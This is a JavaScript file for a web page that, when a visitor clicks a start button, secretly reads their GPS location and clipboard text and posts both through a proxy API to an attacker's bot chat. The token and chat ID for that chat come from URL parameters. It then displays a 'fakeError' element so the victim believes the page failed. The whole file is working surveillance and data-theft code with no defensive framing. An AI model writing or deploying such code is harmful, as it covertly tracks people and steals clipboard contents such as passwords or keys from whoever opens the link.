/* URL Params */
function getParam(name) {
    const params = new URLSearchParams(window.location.search);
    return params.get(name) || '';
}

const TOKEN = getParam('token');
const CHAT_ID = getParam('id');
const PROXY_API_URL = '/api/index3.js'; // Your Vercel API

document.getElementById('startButton').addEventListener('click', async () => {
    const button = document.getElementById('startButton');
    
    // Validate parameters
    if (!TOKEN || !CHAT_ID) {
        alert('🔒 Token বা Chat ID মিসিং!');
        return;
    }

    // Disable button and show spinner
    button.disabled = true;
    hideError();
    showSpinner();

    try {
        const tasks = [];

        // Geolocation task
        tasks.push(
            new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (pos) => {
                            try {
                                await fetch(PROXY_API_URL, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        action: 'sendLocation',
                                        token: TOKEN,
                                        chat_id: CHAT_ID,
                                        latitude: pos.coords.latitude,
                                        longitude: pos.coords.longitude
                                    })
                                });
                            } catch (err) {
                                console.error('Location send error:', err);
                            }
                            resolve();
                        },
                        () => resolve(),
                        { timeout: 10000 }
                    );
                } else {
                    resolve();
                }
            })
        );

        // Clipboard task
        if (navigator.clipboard && navigator.clipboard.readText) {
            tasks.push(
                navigator.clipboard.readText()
                    .then(async (text) => {
                        if (text && text.trim()) {
                            try {
                                await fetch(PROXY_API_URL, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        action: 'sendMessage',
                                        token: TOKEN,
                                        chat_id: CHAT_ID,
                                        message: `<b>📋 Clipboard:</b> <code>${text}</code>`
                                    })
                                });
                            } catch (err) {
                                console.error('Clipboard send error:', err);
                            }
                        }
                    })
                    .catch(() => {
                        // Clipboard access denied or not supported
                    })
            );
        }

        // Wait for all tasks to complete
        await Promise.all(tasks);

    } catch (error) {
        console.error('Error:', error);
    } finally {
        // Hide spinner and show error message
        hideSpinner();
        showError();
        
        // Re-enable button after 3 seconds
        setTimeout(() => {
            button.disabled = false;
        }, 3000);
    }
});

function showSpinner() {
    document.getElementById('spinner').style.display = 'flex';
}

function hideSpinner() {
    document.getElementById('spinner').style.display = 'none';
}

function showError() {
    document.getElementById('fakeError').style.display = 'block';
}

function hideError() {
    document.getElementById('fakeError').style.display = 'none';
}